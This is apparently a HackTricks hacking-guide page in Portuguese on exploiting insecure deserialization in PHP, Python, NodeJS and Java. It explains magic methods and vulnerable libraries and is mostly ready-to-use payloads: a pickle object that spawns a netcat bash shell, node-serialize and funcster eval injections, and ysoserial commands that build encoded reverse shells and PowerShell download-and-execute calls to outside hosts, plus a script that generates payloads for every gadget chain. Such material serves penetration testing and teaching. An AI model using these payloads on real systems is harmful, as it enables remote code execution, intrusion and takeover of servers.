# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**Serializa√ß√£o** √© entendida como o m√©todo de converter um objeto em um formato que pode ser preservado, com a inten√ß√£o de armazenar o objeto ou transmiti-lo como parte de um processo de comunica√ß√£o. Essa t√©cnica √© comumente empregada para garantir que o objeto possa ser recriado em um momento posterior, mantendo sua estrutura e estado.

**Desserializa√ß√£o**, por outro lado, √© o processo que contrabalan√ßa a serializa√ß√£o. Envolve pegar dados que foram estruturados em um formato espec√≠fico e reconstru√≠-los de volta em um objeto.

A desserializa√ß√£o pode ser perigosa porque potencialmente **permite que atacantes manipulem os dados serializados para executar c√≥digo prejudicial** ou causar comportamentos inesperados na aplica√ß√£o durante o processo de reconstru√ß√£o do objeto.

## PHP

Em PHP, m√©todos m√°gicos espec√≠ficos s√£o utilizados durante os processos de serializa√ß√£o e desserializa√ß√£o:

* `__sleep`: Invocado quando um objeto est√° sendo serializado. Este m√©todo deve retornar um array com os nomes de todas as propriedades do objeto que devem ser serializadas. √â comumente usado para comprometer dados pendentes ou realizar tarefas de limpeza semelhantes.
* `__wakeup`: Chamado quando um objeto est√° sendo desserializado. √â usado para restabelecer quaisquer conex√µes de banco de dados que possam ter sido perdidas durante a serializa√ß√£o e realizar outras tarefas de reinicializa√ß√£o.
* `__unserialize`: Este m√©todo √© chamado em vez de `__wakeup` (se existir) quando um objeto est√° sendo desserializado. Ele oferece mais controle sobre o processo de desserializa√ß√£o em compara√ß√£o com `__wakeup`.
* `__destruct`: Este m√©todo √© chamado quando um objeto est√° prestes a ser destru√≠do ou quando o script termina. √â tipicamente usado para tarefas de limpeza, como fechar manipuladores de arquivos ou conex√µes de banco de dados.
* `__toString`: Este m√©todo permite que um objeto seja tratado como uma string. Pode ser usado para ler um arquivo ou outras tarefas com base nas chamadas de fun√ß√£o dentro dele, fornecendo efetivamente uma representa√ß√£o textual do objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Se voc√™ olhar para os resultados, pode ver que as fun√ß√µes **`__wakeup`** e **`__destruct`** s√£o chamadas quando o objeto √© desserializado. Note que em v√°rios tutoriais voc√™ encontrar√° que a fun√ß√£o **`__toString`** √© chamada ao tentar imprimir algum atributo, mas aparentemente isso **n√£o est√° acontecendo mais**.

{% hint style="warning" %}
O m√©todo **`__unserialize(array $data)`** √© chamado **em vez de `__wakeup()`** se estiver implementado na classe. Ele permite desserializar o objeto fornecendo os dados serializados como um array. Voc√™ pode usar este m√©todo para desserializar propriedades e realizar quaisquer tarefas necess√°rias ap√≥s a desserializa√ß√£o.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Voc√™ pode ler um **exemplo de PHP explicado aqui**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqui [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou aqui [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Voc√™ pode abusar da funcionalidade de autoload do PHP para carregar arquivos php arbitr√°rios e mais:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Se por algum motivo voc√™ quiser serializar um valor como uma **refer√™ncia a outro valor serializado**, voc√™ pode:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) pode ajud√°-lo a gerar payloads para abusar de deserializa√ß√µes em PHP.\
Note que em v√°rios casos voc√™ **n√£o conseguir√° encontrar uma maneira de abusar de uma deserializa√ß√£o no c√≥digo-fonte** da aplica√ß√£o, mas pode ser capaz de **abusar do c√≥digo de extens√µes PHP externas.**\
Portanto, se puder, verifique o `phpinfo()` do servidor e **pesquise na internet** (e at√© mesmo nos **gadgets** do **PHPGGC**) alguns poss√≠veis gadgets que voc√™ poderia abusar.

### deserializa√ß√£o de metadados phar://

Se voc√™ encontrou um LFI que est√° apenas lendo o arquivo e n√£o executando o c√≥digo php dentro dele, por exemplo, usando fun√ß√µes como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**.** Voc√™ pode tentar abusar de uma **deserializa√ß√£o** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informa√ß√µes, leia o seguinte post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Quando o objeto √© deserializado, a fun√ß√£o _\_\_reduce\_\__ ser√° executada.\
Quando explorado, o servidor pode retornar um erro.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Para mais informa√ß√µes sobre como escapar de **pickle jails**, consulte:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

A p√°gina a seguir apresenta a t√©cnica para **abusar de uma desserializa√ß√£o insegura em bibliotecas python de yamls** e termina com uma ferramenta que pode ser usada para gerar payloads de desserializa√ß√£o RCE para **Pickle, PyYAML, jsonpickle e ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Polui√ß√£o de Prot√≥tipos em Python)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Fun√ß√µes M√°gicas JS

JS **n√£o tem fun√ß√µes "m√°gicas"** como PHP ou Python que s√£o executadas apenas para criar um objeto. Mas possui algumas **fun√ß√µes** que s√£o **frequentemente usadas mesmo sem serem chamadas diretamente**, como **`toString`**, **`valueOf`**, **`toJSON`**.\
Se abusar de uma desserializa√ß√£o, voc√™ pode **comprometer essas fun√ß√µes para executar outro c√≥digo** (potencialmente abusando de polui√ß√µes de prot√≥tipos) e poderia executar c√≥digo arbitr√°rio quando elas forem chamadas.

Outra **maneira "m√°gica" de chamar uma fun√ß√£o** sem cham√°-la diretamente √© **comprometendo um objeto que √© retornado por uma fun√ß√£o ass√≠ncrona** (promise). Porque, se voc√™ **transformar** esse **objeto de retorno** em outra **promise** com uma **propriedade** chamada **"then" do tipo fun√ß√£o**, ela ser√° **executada** apenas porque √© retornada por outra promise. _Siga_ [_**este link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para mais informa√ß√µes._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` e polui√ß√£o de `prototype`

Se voc√™ quiser aprender sobre essa t√©cnica **d√™ uma olhada no seguinte tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar fun√ß√µes. Exemplo:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
O **objeto serializado** parecer√° assim:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Voc√™ pode ver no exemplo que, quando uma fun√ß√£o √© serializada, a flag `_$$ND_FUNC$$_` √© anexada ao objeto serializado.

Dentro do arquivo `node-serialize/lib/serialize.js`, voc√™ pode encontrar a mesma flag e como o c√≥digo a utiliza.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Como voc√™ pode ver no √∫ltimo trecho de c√≥digo, **se a flag for encontrada**, `eval` √© usado para desserializar a fun√ß√£o, ent√£o basicamente **a entrada do usu√°rio est√° sendo usada dentro da fun√ß√£o `eval`**.

No entanto, **apenas serializar** uma fun√ß√£o **n√£o a executar√°**, pois seria necess√°rio que alguma parte do c√≥digo **chamasse `y.rce`** em nosso exemplo, e isso √© altamente **improv√°vel**.\
De qualquer forma, voc√™ poderia apenas **modificar o objeto serializado** **adicionando alguns par√™nteses** para que a fun√ß√£o serializada seja executada automaticamente quando o objeto for desserializado.\
No pr√≥ximo trecho de c√≥digo, **note o √∫ltimo par√™ntese** e como a fun√ß√£o `unserialize` executar√° automaticamente o c√≥digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como foi indicado anteriormente, esta biblioteca obter√° o c√≥digo ap√≥s `_$$ND_FUNC$$_` e **o executar√°** usando `eval`. Portanto, para **auto-executar c√≥digo**, voc√™ pode **deletar a parte de cria√ß√£o da fun√ß√£o** e o √∫ltimo par√™ntese e **apenas executar um JS oneliner** como no seguinte exemplo:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Voc√™ pode [**encontrar aqui**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **mais informa√ß√µes** sobre como explorar essa vulnerabilidade.

### [funcster](https://www.npmjs.com/package/funcster)

Um aspecto not√°vel do **funcster** √© a inacessibilidade dos **objetos embutidos padr√£o**; eles est√£o fora do escopo acess√≠vel. Essa restri√ß√£o impede a execu√ß√£o de c√≥digo que tenta invocar m√©todos em objetos embutidos, levando a exce√ß√µes como `"ReferenceError: console is not defined"` quando comandos como `console.log()` ou `require(something)` s√£o usados.

Apesar dessa limita√ß√£o, a restaura√ß√£o do acesso total ao contexto global, incluindo todos os objetos embutidos padr√£o, √© poss√≠vel atrav√©s de uma abordagem espec√≠fica. Ao aproveitar o contexto global diretamente, √© poss√≠vel contornar essa restri√ß√£o. Por exemplo, o acesso pode ser restabelecido usando o seguinte trecho:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para**[ **mais informa√ß√µes, leia esta fonte**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

O pacote **serialize-javascript** √© projetado exclusivamente para fins de serializa√ß√£o, n√£o possuindo nenhuma capacidade de desserializa√ß√£o embutida. Os usu√°rios s√£o respons√°veis por implementar seu pr√≥prio m√©todo para desserializa√ß√£o. O uso direto de `eval` √© sugerido pelo exemplo oficial para desserializar dados serializados:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Se esta fun√ß√£o for usada para desserializar objetos, voc√™ pode **explor√°-la facilmente**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para**[ **mais informa√ß√µes, leia esta fonte**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteca Cryo

Nas p√°ginas seguintes, voc√™ pode encontrar informa√ß√µes sobre como abusar desta biblioteca para executar comandos arbitr√°rios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Em Java, **os callbacks de deserializa√ß√£o s√£o executados durante o processo de deserializa√ß√£o**. Essa execu√ß√£o pode ser explorada por atacantes que criam payloads maliciosos que acionam esses callbacks, levando √† potencial execu√ß√£o de a√ß√µes prejudiciais.

### Impress√µes digitais

#### Caixa Branca

Para identificar potenciais vulnerabilidades de serializa√ß√£o na base de c√≥digo, procure por:

* Classes que implementam a interface `Serializable`.
* Uso das fun√ß√µes `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Preste aten√ß√£o especial a:

* `XMLDecoder` utilizado com par√¢metros definidos por usu√°rios externos.
* O m√©todo `fromXML` do `XStream`, especialmente se a vers√£o do XStream for menor ou igual a 1.46, pois √© suscet√≠vel a problemas de serializa√ß√£o.
* `ObjectInputStream` acoplado ao m√©todo `readObject`.
* Implementa√ß√£o de m√©todos como `readObject`, `readObjectNodData`, `readResolve` ou `readExternal`.
* `ObjectInputStream.readUnshared`.
* Uso geral de `Serializable`.

#### Caixa Preta

Para testes de caixa preta, procure por **assinaturas espec√≠ficas ou "Bytes M√°gicos"** que denotam objetos serializados em java (originando de `ObjectInputStream`):

* Padr√£o hexadecimal: `AC ED 00 05`.
* Padr√£o Base64: `rO0`.
* Cabe√ßalhos de resposta HTTP com `Content-type` definido como `application/x-java-serialized-object`.
* Padr√£o hexadecimal indicando compress√£o anterior: `1F 8B 08 00`.
* Padr√£o Base64 indicando compress√£o anterior: `H4sIA`.
* Arquivos web com a extens√£o `.faces` e o par√¢metro `faces.ViewState`. Descobrir esses padr√µes em uma aplica√ß√£o web deve levar a uma investiga√ß√£o conforme detalhado no [post sobre Deserializa√ß√£o de ViewState do Java JSF](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verifique se √© vulner√°vel

Se voc√™ quer **aprender como funciona um exploit de Deserializa√ß√£o em Java**, voc√™ deve dar uma olhada em [**Deserializa√ß√£o B√°sica em Java**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializa√ß√£o DNS em Java**](java-dns-deserialization-and-gadgetprobe.md), e [**Carga √ötil CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Teste de Caixa Branca

Voc√™ pode verificar se h√° alguma aplica√ß√£o instalada com vulnerabilidades conhecidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Voc√™ pode tentar **verificar todas as bibliotecas** conhecidas por serem vulner√°veis e que [**Ysoserial**](https://github.com/frohoff/ysoserial) pode fornecer um exploit. Ou voc√™ pode verificar as bibliotecas indicadas no [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Voc√™ tamb√©m pode usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para procurar poss√≠veis cadeias de gadgets que podem ser exploradas.\
Ao executar **gadgetinspector** (ap√≥s constru√≠-lo), n√£o se preocupe com os muitos avisos/erros que ele est√° passando e deixe-o terminar. Ele escrever√° todas as descobertas em _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Por favor, note que **gadgetinspector n√£o criar√° um exploit e pode indicar falsos positivos**.

#### Teste de Caixa Preta

Usando a extens√£o Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), voc√™ pode identificar **quais bibliotecas est√£o dispon√≠veis** (e at√© mesmo as vers√µes). Com essa informa√ß√£o, pode ser **mais f√°cil escolher um payload** para explorar a vulnerabilidade.\
[**Leia isso para saber mais sobre GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe √© focado em **deserializa√ß√µes de `ObjectInputStream`**.

Usando a extens√£o Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), voc√™ pode **identificar bibliotecas vulner√°veis** explor√°veis com ysoserial e **explor√°-las**.\
[**Leia isso para saber mais sobre Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner √© focado em **deserializa√ß√µes de `ObjectInputStream`**.

Voc√™ tamb√©m pode usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de deserializa√ß√µes** no **Burp**. Este plugin detectar√° **n√£o apenas vulnerabilidades relacionadas a `ObjectInputStream`**, mas **tamb√©m** vulnerabilidades de bibliotecas de deserializa√ß√£o de **Json** e **Yml**. No modo ativo, ele tentar√° confirm√°-las usando payloads de sleep ou DNS.\
[**Voc√™ pode encontrar mais informa√ß√µes sobre Freddy aqui.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Teste de Serializa√ß√£o**

Nem tudo se resume a verificar se alguma biblioteca vulner√°vel est√° sendo usada pelo servidor. √Äs vezes, voc√™ pode ser capaz de **alterar os dados dentro do objeto serializado e contornar algumas verifica√ß√µes** (talvez concedendo a voc√™ privil√©gios de administrador dentro de uma webapp).\
Se voc√™ encontrar um objeto Java serializado sendo enviado para uma aplica√ß√£o web, **voc√™ pode usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir em um formato mais leg√≠vel por humanos o objeto de serializa√ß√£o que est√° sendo enviado**. Saber quais dados voc√™ est√° enviando tornaria mais f√°cil modific√°-los e contornar algumas verifica√ß√µes.

### **Exploit**

#### **ysoserial**

A principal ferramenta para explorar deserializa√ß√µes Java √© [**ysoserial**](https://github.com/frohoff/ysoserial) ([**baixe aqui**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Voc√™ tamb√©m pode considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), que permitir√° que voc√™ use comandos complexos (com pipes, por exemplo).\
Note que esta ferramenta √© **focada** em explorar **`ObjectInputStream`**.\
Eu **come√ßaria usando o payload "URLDNS"** **antes de um payload RCE** para testar se a inje√ß√£o √© poss√≠vel. De qualquer forma, note que talvez o payload "URLDNS" n√£o esteja funcionando, mas outro payload RCE esteja.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Quando criar um payload para **java.lang.Runtime.exec()**, voc√™ **n√£o pode usar caracteres especiais** como ">" ou "|" para redirecionar a sa√≠da de uma execu√ß√£o, "$()" para executar comandos ou at√© mesmo **passar argumentos** para um comando separados por **espa√ßos** (voc√™ pode fazer `echo -n "hello world"`, mas n√£o pode fazer `python2 -c 'print "Hello world"'`). Para codificar corretamente o payload, voc√™ pode [usar esta p√°gina da web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Sinta-se √† vontade para usar o pr√≥ximo script para criar **todos os poss√≠veis payloads de execu√ß√£o de c√≥digo** para Windows e Linux e, em seguida, test√°-los na p√°gina da web vulner√°vel:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Voc√™ pode **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto com ysoserial para criar mais exploits**. Mais informa√ß√µes sobre esta ferramenta est√£o nas **apresenta√ß√µes da palestra** onde a ferramenta foi apresentada: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) pode ser usado para gerar payloads para explorar diferentes **Json** e **Yml** bibliotecas de serializa√ß√£o em Java.\
Para compilar o projeto, eu precisei **adicionar** estas **depend√™ncias** ao `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instale o maven**, e **compile** o projeto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Leia mais sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Se voc√™ quiser testar alguns payloads ysoserial, voc√™ pode **executar este webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java usa muita serializa√ß√£o para v√°rios prop√≥sitos, como:

* **Requisi√ß√µes HTTP**: A serializa√ß√£o √© amplamente empregada na gest√£o de par√¢metros, ViewState, cookies, etc.
* **RMI (Remote Method Invocation)**: O protocolo RMI do Java, que depende inteiramente da serializa√ß√£o, √© um pilar para comunica√ß√£o remota em aplica√ß√µes Java.
